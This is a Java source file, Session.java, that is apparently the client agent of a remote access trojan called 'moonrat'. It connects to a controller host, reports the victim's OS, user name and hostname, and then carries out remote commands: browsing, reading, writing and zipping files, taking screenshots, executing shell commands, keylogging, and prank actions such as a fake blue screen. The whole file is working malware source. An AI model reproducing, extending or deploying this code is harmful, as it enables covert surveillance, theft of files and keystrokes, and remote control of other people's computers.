package moonrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import moonrat.Protocol;
import moonrat.Protocol.Frame;
import moonrat.client.tasks.FileTasks;
import moonrat.client.tasks.FunTasks;
import moonrat.client.tasks.GameTasks;
import moonrat.client.tasks.Keylog;
import moonrat.client.tasks.ScreenTasks;
import moonrat.client.tasks.ShellTasks;

public final class Session {
    private final String host;
    private final int port;
    private final String id;
    private final Keylog keylog = new Keylog();
    private final Object writeLock = new Object();
    private final ExecutorService workers = Executors.newCachedThreadPool(runnable -> {
        Thread thread = new Thread(runnable, "agent-worker");
        thread.setDaemon(true);
        return thread;
    });

    private DataOutputStream out;

    public Session(String host, int port, String id) {
        this.host = host;
        this.port = port;
        this.id = id;
    }

    public void run() throws Exception {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(host, port), 10000);
            socket.setTcpNoDelay(true);

            DataInputStream in = new DataInputStream(socket.getInputStream());
            out = new DataOutputStream(socket.getOutputStream());

            send(new Frame(Protocol.HELLO, id,
                    System.getProperty("os.name"),
                    System.getProperty("user.name"),
                    hostname(),
                    Env.describe()));
            System.out.println("[+] connected to " + host + ":" + port + " as " + id);

            while (true) {
                Frame request = Protocol.readFrame(in);
                if (request.type == Protocol.PING) {
                    send(new Frame(Protocol.PONG));
                    continue;
                }
                workers.execute(() -> answer(request));
            }
        } finally {
            keylog.shutdown();
            workers.shutdownNow();
        }
    }

    private void answer(Frame request) {
        Frame response;
        switch (request.type) {
            case Protocol.LS_REQ:
                response = FileTasks.list(request.field(0));
                break;
            case Protocol.GET_REQ:
                response = FileTasks.read(request.field(0));
                break;
            case Protocol.PUT_REQ:
                response = FileTasks.write(request.field(0), request.blob, parseLong(request.field(1)));
                break;
            case Protocol.ZIP_REQ:
                response = FileTasks.zip(request.field(0));
                break;
            case Protocol.SHOT_REQ:
                response = ScreenTasks.capture(request.field(0), request.field(1));
                break;
            case Protocol.EXEC_REQ:
                response = ShellTasks.exec(request.field(0));
                break;
            case Protocol.RUN_REQ:
                response = ShellTasks.run(request.field(0), request.field(1));
                break;
            case Protocol.BSOD_REQ:
                response = FunTasks.bsod(request.field(0));
                break;
            case Protocol.SOUND_REQ:
                response = FunTasks.sound(request.field(0), request.field(1));
                break;
            case Protocol.NOTIFY_REQ:
                response = FunTasks.notify(request.field(0), request.field(1));
                break;
            case Protocol.KEYLOG_REQ:
                response = keylog.handle(request.field(0));
                break;
            case Protocol.GAME_REQ:
                response = GameTasks.handle(request.field(0), request.field(1));
                break;
            default:
                response = null;
        }

        if (response == null) return;
        response.reqId = request.reqId;
        send(response);
    }

    private void send(Frame frame) {
        synchronized (writeLock) {
            try {
                Protocol.writeFrame(out, frame);
            } catch (IOException ignored) {
            }
        }
    }

    private static long parseLong(String value) {
        try {
            return Long.parseLong(value);
        } catch (Exception failure) {
            return 0;
        }
    }

    private static String hostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception failure) {
            return "unknown";
        }
    }
}
